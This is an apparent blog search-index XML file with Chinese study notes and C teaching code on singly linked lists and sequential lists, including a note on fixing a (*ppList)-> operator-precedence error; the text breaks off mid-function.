<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[线性表之链表的理解2]]></title>
    <url>%2F2018%2F01%2F23%2F1%2F</url>
    <content type="text"><![CDATA[梦倒塌的地方 今已爬满青苔 前言这个是一个关于链表看代码的时候，发现的一些关于二级指针和运算符的问题。 问题 在看代码的时候，发现了这样一个问题，pTail指针没有分配空间直接使用了，虽然程序没有问题，但是很明显是错误的。通过修改，在其中发现的一些问题。 int createList(LIST **ppList) //一般我们都将指向单链表第一个结点（或表头结点）的指针命名为head，这是习惯约定 { struct LIST *pNewList; struct NODE *pNewNode; if (ppList==NULL) return PARAM_ERROR; pNewNode = (struct NODE *)malloc(sizeof(struct NODE)); //申请空间，注意：申请的是一个表结点的空间(28个字节) if (pNewNode==NULL) { return MALLOC_ERROR; } memset(pNewNode, 0, sizeof(struct NODE));//void *memset(void *s,int c,size_t n) pNewNode-&gt;next = NULL; pNewList = (struct LIST *)malloc(sizeof(struct LIST)); if (pNewList==NULL) { free(pNewNode); return MALLOC_ERROR; } memset(pNewList, 0, sizeof(struct LIST)); pNewList-&gt;Count= 0; pNewList-&gt;pHeadOfData = pNewNode; //表对象的数据指针指向刚才建好的表头结点。 //以下添加了一行代码 pNewList-&gt;pTailOfData= pNewNode; *ppList = pNewList; //给表头指针赋值为表头结点的地址。 //这是套路，先用一个临时变量pNewList去操作数据，然后交付给*ppList return 0; } int createList2(LIST **ppList) { struct NODE *pNew; struct NODE *pTail; Elemtype Data; if (ppList==NULL) return PARAM_ERROR; createList(ppList); printf(&quot;请输入学生的5位证件号的值和姓名（空格隔开，ID值为0表示输入结束）：&quot;); scanf(&quot;%ld&quot;, &amp;(Data.ID)); scanf(&quot;%s&quot;, Data.name); //创建并挂接后续的各个结点 while (Data.ID != END_ID) { //创建新的结点并赋值 pNew = (struct NODE *)malloc(sizeof(struct NODE)); //申请空间 if (pNew==NULL) { return MALLOC_ERROR; } memset(pNew, 0, sizeof(struct NODE)); pNew-&gt;data.ID= Data.ID; memcpy(pNew-&gt;data.name, Data.name, strlen(Data.name)); pNew-&gt;next = NULL; //将新结点挂接到原链表中，此步骤很关键！ /* pTail-&gt;next = pNew; pTail = pNew; */ //上面是出问题的地方 (*ppList)-&gt;pTailOfData-&gt;next = pNew; (*ppList)-&gt;pTailOfData= pNew; printf(&quot;请输入学生的5位证件号的值和姓名（空格隔开，ID值为0表示输入结束）：&quot;); scanf(&quot;%ld&quot;, &amp;(Data.ID)); scanf(&quot;%s&quot;, Data.name); } return 0; } 最开始我在createList2()中的修改如下：接下来是的问题： 看linklist中的代码ptail就直接声明了就等于了，我都懵了，根本没有分配空间啊。 问题问题： ppList-&gt;pTailOfData-&gt;next = pNew; ppList-&gt;pTailOfData = pNew; 这是我自己写的 我们一步一步来分析： 首先二级指针的概念问题 在creatlist中有这样一段语句*ppList = pNewList;//pnewlist是一个指向列表的指针，记住他是指针调用其内部的语法应该是这样的：pNewList-&gt;pHeadOfData = pNewNode; 那么从逻辑上讲语句应该是 *ppList-&gt;pTailOfData = pNew;这样才等价于pNewList-&gt;pHeadOfData = pNewNode;我以为这样就没问题了但是提示信息还是一样的 -&gt;pTailOfData左边应该是一个类/结构体/联合体按理来说*ppList就已经是pNewList了而pNewList又是指向一个堆区的结构体 我就想在编译器中会不会将*ppList直接解析为一个指针？但是看到createlist1中有*ppList这样的语句然后我想了二十分钟把所有可能性想完了就一个没想了，符号的优先级！！！！！！！！！！！！！然后（*ppList）-&gt;pTailOfData -&gt;next = pNew; 我选择强颜欢笑。 链表代码/* 适用于标准C LinkList.c 无序单链表的实现代码 */ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; //for memcpy #define OK 1 #define OVERFLOW 0 #define LIST_INIT_SIZE 100 #define LISTINCREMENT 10 //公共错误码，项目组成员之间的共同约定 #define MALLOC_ERROR -1 #define NOTFIND -2 #define PARAM_ERROR -3 #define REALLOC_ERROR -4 #define END_ID 0 typedef struct person { long ID; //4 char name[20]; //20 }Elemtype; //单链表的单个数据结点的类型定义 typedef struct NODE { Elemtype data; //28 struct NODE *next; //4 }NODE, *pNODE; //如果定义数据结点的对象或变量，每个变量有24+4=28个字节 //单链表整体结构的类型定义 typedef struct LIST { int Count; //数据个数，即表长。该信息使用频繁，3种思路可做： //1. 定义为pubblic权限的成员变量Count，增删清空等时候维护该变量，获取时直接以list1.Count的形式返回——有安全风险，且容易引发混乱，不提倡 //2. 定义成成员方法getCount()的形式，调用方法，临时去计算并返回长度值。 ——计算费时，不适合频繁使用，尤其是数据量很大的时候 // 3. 定义为private权限的成员变量Count，增删清空等时候维护该变量，获取时用public权限的成员方法getCount()去读取该变量。——这是实际普遍使用的方式 struct NODE *pHeadOfData; //指向单链表表头的指针，即书上所说的head指针。必须是private权限的，不允许其他类的对象来修改这个成员的值，对使用链表的程序员透明（即：不需要知道它的存在）。指向表头结点，一旦创建了链表对象，在销毁之前永不变。 //下面是不太重要或常用的一些成员，同学们可以自由发挥想一下，例如如下： int maxValue; //一个并不成熟的设计，要求数据必须是可相互比较的类型，且删除后不好维护 int minValue; struct NODE *pTailOfData; //以方便快速定位到表尾结点（在数据的尾插法中可以用到） // ...... }LIST, *LINKLIST; //如果定义对象，则每个对象有4+4+4+4=16个字节 /***************************************************************** * 函数名字：SearchByPos * 函数功能：查询指定的单链表中指定位置的元素，获得其数据结点的地址 * 函数参数：pList ——指向某单链表对象的一级指针，要求非空 * pos ——所搜数据在表中的逻辑位置（编号从0开始） * ppNode——向主调函数传出（加一级指针）该表的第pos个结点的地址（一级指针），故此处需要用1+1=2级指针的参数类型 * 如果没找到第pos个元素，则该参数返回NULL，即0x00000000 * 函数返回：int型，0表示操作正常结束； -2（NOTFIND）表示没找到； -3（PARAM_ERROR）表示参数校验失败 * 备 注：同学们可以自己写SearchByValue函数 * 该函数如果在类中，可设为public权限，开放 */ //根据逻辑顺序值pos，在单链表pList中，将第pos个元素结点的地址值以参数形式传出。 int SearchByPos(LIST *pList, int pos, NODE **ppNode) { int i; NODE *p; //参数校验 if (pList==NULL) { return PARAM_ERROR; } i= 0; p= pList-&gt;pHeadOfData; while ( i&lt;pos &amp;&amp; p-&gt;next!= NULL) //当没有数到逻辑顺序的第i个结点 并且 还没有到表尾的时候，则 { p= p-&gt;next; //一边将p指针指向下一个结点 i++; //一边计数 } if ( i==pos ) // 如果 i== pos，即p指向第pos个元素了 { *ppNode= p; //如果是以“找到第pos个元素”的姿态跳出while循环 return 0; } else //如果是p-&gt;next== NULL，即以“到表尾”的姿态跳出while循环 { *ppNode= NULL; return NOTFIND; } } /***************************************************************** * 函数名字：Insert * 函数功能：插入一个元素到指定的单链表中的指定位置后 * 函数参数：pList——指向某单链表对象的一级指针，要求非空 * value——需要添加或插入的元素的值，假定元素值是有效的; 可稍作改动，支持结构体变量类型 * pos ——需要插入的逻辑位置（之后），pos大于表长时视为“表尾追加元素”，pos&lt;=0时视为“表头后插入元素” * 函数返回：int型，0表示操作正常结束 * 备 注：本函数不对上层程序员开放。在无序表中，不需要指定插入的位置（因为无序表中元素的先后顺序并不重要。在Java或C++的有些类中，也提供了这种插入操作，主要是在指定位置之前插入。同学们可以自行设计和尝试改写下面代码） * 在有序表中，其该插入的位置是由其值的大小来决定的，无须指定插入位置pos；而且，有序表，主要都用在顺序表中，很少有用在单链表里的情况。查找很不方便哦！折半查找没法用！（作为练手，同学们可以尝试编写这个插入方法） * 该函数如果在类中，可设为private权限，不开放 */ int Insert(LIST *pList, Elemtype value, int pos) { long len; int ret; struct NODE *pNew= NULL; struct NODE *pPre= NULL; //参数校验 if (pList==NULL) { return PARAM_ERROR; } //参数调整 len= pList-&gt;Count; //将长度信息读出来备用，len变量不定义也是可以的。 if (pos &gt;= len) pos= len; if (pos &lt;0) pos= 0; //插入第一步：申请新结点空间 pNew= (struct NODE *)malloc(sizeof(struct NODE)); if (pNew==NULL) { return MALLOC_ERROR; } //插入第二步：填值到新结点空间，准备就绪 memset(pNew, 0, sizeof(struct NODE)); pNew-&gt;data.ID= value.ID; //此处不能直接写成pNew-&gt;data= value; memcpy(pNew-&gt;data.name, value.name, strlen(value.name)); pNew-&gt;next= NULL; //插入第三步：找到第pos个结点，以备在其后插入新结点 ret= SearchByPos(pList, pos, &amp;pPre); if (ret== NOTFIND) { free(pNew); return NOTFIND; } //插入第四步：插入结点 pNew-&gt;next= pPre-&gt;next; pPre-&gt;next= pNew; //插入第五步：长度值别忘了+1 pList-&gt;Count++; return 0; } /***************************************************************** * 函数名字：AddToTail * 函数功能：往“无序”的线性“表尾”后面添加一个元素（即：在表尾追加一个元素结点） * 函数参数：pList——指向某单链表对象的一级指针，要求非空 * value——需要添加的元素的值，假定元素值是有效的; 可稍作改动，支持结构体变量类型 * 函数返回：int型，0表示操作正常结束 * 备 注：该函数如果在类中，可设为public权限，开放给上层程序员使用 */ int AddToTail(LIST *pList, Elemtype value) //AddToTail(pList1, value); { int len; len= pList-&gt;Count; return Insert(pList, value, len); } /***************************************************************** * 函数名字：AddToHead * 函数功能：往“无序”的线性“表头”后面添加一个元素结点 * 函数参数：pList——指向某单链表对象的一级指针，要求非空 * value——需要添加的元素的值，假定元素值是有效的; 可稍作改动，支持结构体变量类型 * 函数返回：int型，0表示操作正常结束 * 备 注：该函数如果在类中，可设为public权限，开放给上层程序员使用 */ int AddToHead(LIST *pList, Elemtype value) { return Insert(pList, value, 0); //在第一个元素之前（即：第0个元素之后）插入元素结点 } /***************************************************************** * 函数名字：createList * 函数功能：创建一个空的带表头节点的单向链表 * 函数参数：ppList——是一个2级指针，调用结束后*ppList指向一个单链表结构的对象 * 函数返回：int型，0表示操作正常结束 * 备 注：该函数如果在类中，可设为public权限，开放给上层程序员使用 */ //创建一个带表头结点的链表，完成数据输入和串接 int createList(LIST **ppList) //一般我们都将指向单链表第一个结点（或表头结点）的指针命名为head，这是习惯约定 { struct LIST *pNewList; struct NODE *pNewNode; if (ppList==NULL) //参数校验，注意：此处校验的是ppList（不能为空，口袋必须要有！），不是*ppList（可以为NULL，表示有口袋，但是口袋里什么东西都没有）。 return PARAM_ERROR; //创建一个表头结点，并用pNewList指向该空间 pNewNode = (struct NODE *)malloc(sizeof(struct NODE)); //申请空间，注意：申请的是一个表结点的空间(28个字节) if (pNewNode==NULL) { return MALLOC_ERROR; } memset(pNewNode, 0, sizeof(struct NODE));//void *memset(void *s,int c,size_t n) //总的作用：将已开辟内存空间 s 的首 n 个字节的值设为值 c。 //从pNewNode pNewNode-&gt;next = NULL; //空表，没有后续结点。表头结点的data域不需要处理，清0即可。另，养成良好习惯，当结点的next成员指向何方尚不明朗时，先置为NULL以防患于未然，避免野指针。 //创建一个表对象的空间，并用pNewList指向该空间 pNewList = (struct LIST *)malloc(sizeof(struct LIST)); //申请空间，注意：申请的是一个表对象的空间(16个字节)，而不是一个表结点的空间(28个字节) if (pNewList==NULL) { free(pNewNode); //在发生异常，准备退出之前，先把之前成功申请的pNewNode结点空间给释放了！这一点很多程序员容易忽略，造成内存泄露！ // 两个没有关联 为什么要释放？？？//堆区的东西，释放，不然没人回收 return MALLOC_ERROR; } memset(pNewList, 0, sizeof(struct LIST)); pNewList-&gt;Count= 0; //设置该空表头的表长值为0 pNewList-&gt;pHeadOfData = pNewNode; //表对象的数据指针指向刚才建好的表头结点。 pNewList-&gt;pTailOfData= pNewNode; *ppList = pNewList; //给表头指针赋值为表头结点的地址。 //这是套路，先用一个临时变量pNewList去操作数据，然后交付给*ppList return 0; //本函数是如何返回表头指针的？又如何调用本函数呢？思考这2个问题！能画出内存四区图来么？ } /***************************************************************** * 函数名字：createList2 * 函数功能：创建一个单向链表，并填入数据，以尾插法实现结点挂接。 * 函数参数： * 函数返回：LIST ** （函数运行结束之后，返回指向该表对象空间的一个2级指针） * 备 注：以前数据结构的老版本，没学过面向对象思想的人才会这么写 这个方法不是面向对象的思想！不会成为单链表类的一个成员函数。写在这里，只是为了给同学们展示目前大多数教科书或考题中的一个不成熟的考法。 */ //创建一个带表头结点的链表，并且完成数据输入和串接 int createList2(LIST **ppList) { struct NODE *pNew; struct NODE *pTail; Elemtype Data; if (ppList==NULL) //参数校验 return PARAM_ERROR; createList(ppList); //调用之前定义的函数，产生一个空表 printf(&quot;请输入学生的5位证件号的值和姓名（空格隔开，ID值为0表示输入结束）：&quot;); scanf(&quot;%ld&quot;, &amp;(Data.ID)); scanf(&quot;%s&quot;, Data.name); //创建并挂接后续的各个结点 while (Data.ID != END_ID) //程序员和用户已约定：当用户输入的数据为0（END_ID）时，表示数据录入的结束（注意，此约定不是唯一方法，仅供学习时适用） { //创建新的结点并赋值 pNew = (struct NODE *)malloc(sizeof(struct NODE)); //申请空间 if (pNew==NULL) { return MALLOC_ERROR; } memset(pNew, 0, sizeof(struct NODE)); pNew-&gt;data.ID= Data.ID; //为新结点的data域填入数据 memcpy(pNew-&gt;data.name, Data.name, strlen(Data.name)); pNew-&gt;next = NULL; //为新结点的next域填入数据，指向不行时填入NULL；或因为其是新的表尾结点，所以也应该将其next域填入NULL表示链表在结尾。 //将新结点挂接到原链表中，此步骤很关键！ /* pTail-&gt;next = pNew; //pTail专门指向链表当前的最后一个结点，此行代码实现了将新结点连入链表尾部 pTail = pNew; //pTail指向的结点已经不是链表的表尾结点了（挂接之后，pNew指向的结点才是新的表尾结点），故而刷新pTail，让其指向新的表尾结点。 */ (*ppList)-&gt;pTailOfData-&gt;next = pNew; (*ppList)-&gt;pTailOfData= pNew; printf(&quot;请输入学生的5位证件号的值和姓名（空格隔开，ID值为0表示输入结束）：&quot;); scanf(&quot;%ld&quot;, &amp;(Data.ID)); scanf(&quot;%s&quot;, Data.name); } return 0; //本函数是如何返回一个表的？思考这个问题！ } /***************************************************************** * 函数名字：output * 函数功能：输出单链表的所有结点数据，在屏幕上显示打印 * 函数参数：pList——指向某单链表对象的一级指针，要求非空（有了它，我们就能顺藤摸瓜，找出所有数据） * 函数返回：无（这是一个打印或显示类型的函数，不需要返回任何数据） */ void output(struct LIST *pList) { struct NODE *p; if (pList==NULL) //参数如果不正确，则直接罢工 return; p = pList-&gt;pHeadOfData-&gt;next; //&quot;顺藤&quot;，从pHeadOfData-&gt;next开始，跳过表头节点的Data域不打印 while (p != NULL) //到尾。注意，单链表的最后一个结点的next域的值为NULL，本块代码也是读取单链表的标准模板 { printf(&quot;%6d &quot;, p-&gt;data.ID); //&quot;摸瓜&quot; printf(&quot;%s\n&quot;, p-&gt;data.name); p = p-&gt;next; //千万别忘记本行代码，否则死循环了 } return ; } /***************************************************************** * 函数名字：DelByPos * 函数功能：删除指定单链表中指定逻辑顺序位置的元素结点，并将删除的元素的值提取出来 * 函数参数：pList ——指向某单链表对象的一级指针，要求非空 * pos ——需要删除的结点的逻辑序号（从0开始编号），pos大于表长或者pos&lt;=0时视为“参数不合法” * pValue——指向被删除元素的值，以方便在有些应用场合中对其做死前最后可能的访问操作。 * 函数返回：int型，0表示操作正常结束 * 备 注：该函数如果在类中，可设为public权限，开放。 */ int DelByPos(struct LIST *pList, int pos, Elemtype *pValue) { int ret; struct NODE *pDel= NULL; struct NODE *pPre= NULL; //参数校验 if (pList==NULL) { return PARAM_ERROR; } //删除第一步：找到第pos-1个结点的地址，顺带着也就校验了pos值是否过大 ret= SearchByPos(pList, pos-1, &amp;pPre); //要删除第pos个元素，在链表这种结构中，需要获取到第pos-1个元素的地址，以方便删除操作 if (ret== NOTFIND) //如果本来该表压根就没有第pos-1个元素，那无法完成删除，pos值过大！ { return PARAM_ERROR; } //删除第二步：获取第pos个结点的地址并暂存该地址（函数的任务就是要删这个结点） pDel= pPre-&gt;next; if (pDel==NULL) //有第pos-1个结点，但恰好没有第pos个结点的情况，仍然归咎于pos参数传入错误 { return PARAM_ERROR; } //删除第三步：将第pos个结点从链表中摘下来，使其脱离链表 pPre-&gt;next= pPre-&gt;next-&gt;next; //删除第四步：（非必须的步骤）将该结点的值拷贝出来，以备上层函数可能使用 pValue-&gt;ID= pDel-&gt;data.ID; memcpy(pValue-&gt;name, pDel-&gt;data.name, strlen(pDel-&gt;data.name)); //删除第五步：释放pDel指针所指向的结点空间（在堆区），注意，并不是释放pDel指针变量本身这4个字节哦！free之后，pDel变量仍然存在！成为了一个野指针！ free(pDel); pDel=NULL; //指针复位操作。可以看出，pDel指针仍然存在，有值，但其指向的空间已被回收。为了避免误操作，特意将这4个字节的空间全部清0，即让pDel指针为NULL //删除第六步：长度值别忘了-1 pList-&gt;Count--; return 0; } // 思考下面的这些操作应该怎么去设计参数和操作思想？ /***************************************************************** * 函数名字：clearList * 函数功能：清空一个单向链表的数据 * 函数参数：pList——是一个指向表对象空间的1级指针。 * 函数返回：int型，0表示操作正常结束 * 备 注：只是清空操作，表对象仍然存在，只是没数据而已。所以表对象指针不会发生变化，没必要用二级指针，一级指针就能搞定。 */ int clearList(LIST *pList) { // 参数校验 // ...... // 做好循环控制并针对每个数据结点，释放结点空间。建议用while循环，想想循环结束条件是什么？ // ...... // pHeadOfData指针复位 // ...... // 调整表长，恢复为0 ，此步骤千万别忘了！ // ...... return 0; } /***************************************************************** * 函数名字：destroyList * 函数功能：销毁一个单向链表 * 函数参数：ppList——是一个2级指针，因为要销毁空间，所以需要在函数内改变实参的值（往外传一个NULL），所以要用2级指针 * 函数返回：int型，0表示操作正常结束 * 备 注： */ int destroyList(LIST **ppList) { // 参数校验 // ...... // 清空数据并销毁数据 // ...... // 释放表对象所占空间 // ...... // 表对象指针复位 // ...... return 0; } /***************************************************************** * 函数名字：MergeList * 函数功能：将2个单链表进行无序合并，合并后不改变原有的2个表的数据。 * 函数参数：pList1——指向某单链表对象1的一级指针，要求非空 * pList2——指向某单链表对象2的一级指针，要求非空 * 函数返回：int型，0表示操作正常结束 * 备 注： */ // int MergeList(LIST *pList1, LIST *pList2) // int MergeList(LIST **ppList1, LIST *pList2) // LIST * MergeList(LIST *pList1, LIST *pList2) // ...... int main(void) { int ret, pos; struct LIST *pList1; // struct LIST *pList2; Elemtype value; //创建链表1，并填入数据 ret= createList(&amp;pList1); // 一定要看清楚此处的用法哦！pList1是一级指针，所以&amp;pList1就是二级指针了（一级指针的地址，有些书上称之为二级指针类型了）！ value.ID= 10; memset(value.name, 0, 20); memcpy(value.name,&quot;汤唯&quot;, 4); AddToTail(pList1, value); value.ID= 20; memset(value.name, 0, 20); memcpy(value.name,&quot;林志玲&quot;, 6); AddToTail(pList1, value); value.ID= 30; memset(value.name, 0, 20); memcpy(value.name,&quot;关之琳&quot;, 6); AddToTail(pList1, value); value.ID= 40; memset(value.name, 0, 20); memcpy(value.name,&quot;迪丽热巴&quot;, 8); AddToTail(pList1, value); output(pList1); //输出显示单链表的所有数据 printf(&quot;=========下面演示删除=====================\n&quot;); pos= 8; ret= DelByPos(pList1, pos, &amp;value); //删除第8个。但是不存在第8个结点，删除失败，返回-1，放弃删除（你也可以编程实现让它在这种情况下（pos&gt;count时）去删除最后一个结点来作为对用户的回应） if (ret== 0) printf(&quot;我删除了%s这个结点\n&quot;, value.name); else printf(&quot;我没法删除第%d个结点\n&quot;, pos); output(pList1); //输出显示单链表的所有数据 // printf(&quot;=========下面用过时的创建函数演示一下========\n&quot;); // ret= createList2(&amp;pList2); //用老方法来创建，在创建的同时就在插入元素，模块的划分有点混乱 // output(pHead2); return 0; }]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[线性表之链表的理解1]]></title>
    <url>%2F2018%2F01%2F20%2F1%2F</url>
    <content type="text"><![CDATA[第一步是最关键的一步。 链表的定义内容1.单个数据的定义typedef struct person { long ID; //4 char name[20]; //20 }Elemtype; 2.定义单个数据节点typedef struct NODE { Elemtype data; //28 struct NODE *next; //4 }NODE, *pNODE; 3.定义整个链表 typedef struct LIST { int Count; struct NODE *pHeadOfData; int minValue; struct NODE *pTailOfData;//以方便快速定位到表尾结点（在数据的尾插法中可以用到） // ...... }LIST, *LINKLIST; //如果定义对象，则每个对象有4+4+4+4=16个字节 用面向对象的思想需要考虑的问题： int iCount; 数据个数，即表长。该信息使用频繁，3种思路可做： 定义为pubblic权限的成员变量Count，增删清空等时候维护该变量，获取时直接以list1.Count的形式返回——有安全风险，且容易引发混乱，不提倡 定义成成员方法getCount()的形式，调用方法，临时去计算并返回长度值。——计算费时，不适合频繁使用，尤其是数据量很大的时候 3.定义为private权限的成员变量Count，增删清空等时候维护该变量，获取时用public权限的成员方法getCount()去读取该变量。——这是实际普遍使用的方式 1.基本想法 2.创建函数最终结果： 具体操作： int createList(LIST **ppList) //一般我们都将指向单链表第一个结点（或表头结点）的指针命名为head，这是习惯约定 { struct LIST *pNewList; struct NODE *pNewNode; if (ppList==NULL) return PARAM_ERROR; //创建一个表头结点，并用pNewList指向该空间 pNewNode = (struct NODE *)malloc(sizeof(struct NODE)); //申请空间，注意：申请的是一个表结点的空间(28个字节) if (pNewNode==NULL) { return MALLOC_ERROR; } memset(pNewNode, 0, sizeof(struct NODE));//void *memset(void *s,int c,size_t n) pNewNode-&gt;next = NULL; //创建一个表对象的空间，并用pNewList指向该空间 pNewList = (struct LIST *)malloc(sizeof(struct LIST)); if (pNewList==NULL) { free(pNewNode); return MALLOC_ERROR; } memset(pNewList, 0, sizeof(struct LIST)); pNewList-&gt;Count= 0; pNewList-&gt;pHeadOfData = pNewNode; *ppList = pNewList; return 0; } 3.输出值p= pList-&gt;pHeadOfData-&gt;next; while( p ! = NULL) { p = p-&gt;next; } 4.插入 int Insert(LIST *pList, Elemtype value, int pos) 除了应该校验等的内容以外接下来的第一步：将内容写入pNew中第二步：找到要插入的pos位置，传入&amp;pPre 去另外一个函数中找位置第三步：插入 pNew-&gt;next = pPre-&gt;next;pPre-&gt;next = pNew;iCount++; 5.删除int DelByPos(struct LIST pList, int pos, Elemtype pValue) *pValue 是为了防止数据的丢失，储存起来 1.先找到pos-1的位置2.存下要被删除的那个的位置 pDel = pPre-&gt;next; 3.删除 pPre-&gt;next = pPre-&gt;next -&gt;next; free(pDel); pDel = NULL; iCount–; 6.找位置int SearchByPos(LIST pList, int pos, NODE *ppNode) while ( inext!= NULL) //当没有数到逻辑顺序的第i个结点 并且 还没有到表尾的时候，则 { p= p-&gt;next; //一边将p指针指向下一个结点 i++; //一边计数 } 分为两种情况：1.找到了，就是inext = NULL;]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[线性表之顺序表理解]]></title>
    <url>%2F2018%2F01%2F19%2F1%2F</url>
    <content type="text"><![CDATA[一息若存，希望不灭。 顺序表的分类1. 静态分配储存空间#define MAXSIZE 100 typedef struct { char Data[MAXSIZE]; //100个字节 int curlen; //4个字节 int totalLen; //4个字节 }SeqList, *PSeqList; 2. 动态分配储存空间typedef struct { char* pData; //4个字节 int curLen; //4个字节 int totalLen; //4个字节 }SeqList, *PSeqList; 以动态链表为例基本想法1. 2.如果想采用一个封装的想法，可以把所有的操作都写入一个类中。 3.这里用C语言实现，使用函数实现。 初始化函数：InitList() main : Seqlist plist = NULL; ret = InitList( &amp;pList );InitList : int InitList(SeqList `*`ppList) 二级指针 传 InitList(&amp;pList) 这里为什么传入是二级指针？第一种：首先plist已经是一个一级指针。再传一个地址进去，就是**的类型了第二种：首先我要传一个东西出来，一重指针，传出来的数据类型还是一个地址（plist )，因此需要** 二级指针解释关于内存图 因为InitList()函数用完就会消失，所以要让plist指向堆区数组 C语言代码实现具体代码实现如下 /* 适用于标准C */ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #define OK 1 #define OVERFLOW 0 #define LIST_INIT_SIZE 100 #define LISTINCREMENT 10 #define Elemtype char //公共错误码，项目组成员之间的共同约定 #define MALLOC_ERROR -1 #define NOTFIND -2 #define PARAM_ERROR -3 #define REALLOC_ERROR -4 //顺序表的结构定义 typedef struct { Elemtype *pElem; //动态模式，只定义了一个指针，未分配数据的存储空间。本例假设每个元素都是char型，此处是实际应用中每个元素可能会是结构体变量或者结构体指针 int iCount; //当前长度 int iTotalLength; //线性表的总长度 }SeqList; //定义一个新类型，顺序表的类型名称 //初始化函数 //因为本子函数想通过子函数的操作，更改主调函数中某个指针的指向，则需要用到二重指针（要在子函数中修改实参的值，需要加一重指针，而这个实参变量还是个一重指针，所以这里累计是1+1=2重指针了！！） //本函数假设要修改的实参指针只是一个指针变量（占4个字节，初始指向哪里不重要，为NULL也行），尚未指向任何结构体变量。 int InitList(SeqList **ppList) { SeqList *pTemp; //在子函数的栈区定义一个临时指针，以方便本函数中后续的建表过程中的各行代码的书写 pTemp= (SeqList*)malloc(sizeof(SeqList)); //先申请12个字节，用于存放顺序表的基本结构，iCount，ITotalLength和pElem成员才会存在 if(pTemp==NULL) { return MALLOC_ERROR; } pTemp-&gt;iCount=0; //初始时，一个元素都没有 pTemp-&gt;iTotalLength= LIST_INIT_SIZE; //初始时理论总长就是100个元素（假定值） pTemp-&gt;pElem= (Elemtype *)malloc( LIST_INIT_SIZE * sizeof(Elemtype)); //因为SeqList的定义中，elem只是一个指针，需要分配空间并让该指针指向这段空间。因为malloc可能迸发异常，所以实际中往往会放在try {} catch() {}结构中 if (pTemp-&gt;pElem==NULL) { free(pTemp); //将之前申请的基本表结构所占的空间（12个字节）释放 指的是pTemp指的那个位置被释放 pTemp = NULL; return MALLOC_ERROR; // 返回一个非0值（通常是一个负数），表示本子函数非正常结束，以供主调函数识别和采取对应措施 } *ppList= pTemp; //做好顺序表的表结构和数据区域之后，将该结构（在堆区）交付给实参（一个指针）来指向，从而完成pTemp指针的使命。 //ppList是子函数在栈区中的一个指针变量，它指向主调函数中的一个指针变量，所以*ppList就是主调函数中对应的那个指针（即实参） return 0; //一般情况下，在实际工程开发中，基本上都默认函数返回值为0表示该函数运行期间没有异常情况 } //根据元素的值x，在顺序表pList中，查找其第一次出现的位置下标，并返回(注意，下标可以为0)。如果没找到，则返回NOTFIND，即-2 int SearchByValue(SeqList *pList, Elemtype Value) { int pos=0; //重要的步骤，参数校验！一定别忘了！如果Value有一定的现实含义，则还需要对其做参数有效性校验 if (pList==NULL) { return PARAM_ERROR; } while ( pos&lt;=pList-&gt;iCount-1 &amp;&amp; pList-&gt;pElem[pos]!= Value) //一边比较，一边往后移pos的值，直到找到或者到达有效数据的末尾 //操作总长范围 pos++; if ( pos &lt;= pList-&gt;iCount-1 ) //如果是以“找到”的姿态跳出while循环 return pos; else return NOTFIND; //如果是以“到末尾”的姿态跳出while循环 } //功能：根据给定的逻辑位置值pos（假设从1开始），在pList指向的顺序表中提取其元素值，存放到pValue指针指向的空间中并返回给主调函数使用 //备注：pValue的写法，展示了C语言如何通过参数传递，将子函数内的数据传出来，给主调函数使用，注意形参写法和调用时的实参写法！ // pValue指针，假定其已经指向某个存储空间，本函数不再校验它。问题是：这个空间，应该在主调函数中申请，还是在子函数中申请？一般做法是在主调函数中申请！ int GetValue(SeqList *pList, int pos, Elemtype *pValue) // ret= GetValue(&amp;List1, 2, pmyValue); { //重要的步骤，参数校验！一定别忘了！如果Value有一定的现实含义，则还需要对其做参数有效性校验 if (pList==NULL || pList-&gt;pElem==NULL || pos&lt;1 || pos &gt;pList-&gt;iCount || pValue==NULL) { return PARAM_ERROR; } *pValue= pList-&gt;pElem[pos]; //获得元素值 return 0; } //功能：根据指定的逻辑位置pos值（假设从0开始），在pList指向的顺序表中，第pos个元素后面插入值为Value的元素 //备注：pos的值应&gt;=0，当pos=0时，全体所有数据都需要后移一格；当pos&gt;=iCount时，全体数据都不需要后移 //SeqListInsert(pList1, i, (Elemtype)(&apos;H&apos;-i)); int SeqListInsert(SeqList *pList, int pos, Elemtype Value) // 传一个表的地址，直接传一个表，不稳 //这里排序有两种，第一种是直接传要插入的地址，就是直接知道自己要插入的地址 //第二种，用数组，结合下标的方式插入 //要插入的值就是value { Elemtype *pNewBase, *p, *q; if (pList==NULL || pList-&gt;pElem==NULL || pos &lt;0 ) { return PARAM_ERROR; } if ( pos &gt; pList-&gt;iCount )//pos太大了，大过了icount pos = pList-&gt;iCount ; //如果当前已经装满，则需要扩展存储空间 if (pList-&gt;iCount == pList-&gt;iTotalLength) { pNewBase= (Elemtype *)realloc(pList-&gt;pElem, (pList-&gt;iTotalLength + LISTINCREMENT)*sizeof(Elemtype)); //请同学们进一步了解realloc的工作原理，当空间字节数较多时，该函数开销较大！ if (pNewBase== NULL) { return REALLOC_ERROR; } pList-&gt;pElem= pNewBase; pList-&gt;iTotalLength= pList-&gt;iTotalLength + LISTINCREMENT; } //主逻辑 q= &amp;(pList-&gt;pElem[pos]); //q 指向的这个元素及其后面所有元素都需要后移一格 for(p= &amp;(pList-&gt;pElem[pList-&gt;iCount-1]) ; p&gt;=q; p--) //从后面往前，循环，每个元素后移一格，直到腾出要插入的内存空间。当pos=0时，全体所有数据都需要后移一格； //当pos&gt;=iCount时，全体数据都不需要后移 //第一个iCOunt=1 表示的是0 *(p+1)= *p; *q= Value; //实现插入操作 pList-&gt;iCount++; //元素增加，别忘了让有效长度值iCount加1——随时维护iCount值的准确性，以方便程序员即时读取，而不是在需要的时候才去数个数 return 0; } //合并无序的顺序表 MergeOption:0 不允许重复 1允许重复 int DisorderSeqListMerge(SeqList *pListA, SeqList *pListB, int MergeOption, SeqList **pListC) { int i, ret; if (pListA==NULL || pListA-&gt;pElem==NULL || pListB==NULL || pListB-&gt;pElem==NULL || MergeOption &lt; 0 || MergeOption &gt; 1 ) { return PARAM_ERROR; } *pListC= (SeqList *)malloc( sizeof(SeqList)); if (*pListC==NULL) { return MALLOC_ERROR; } (*pListC)-&gt;iTotalLength= 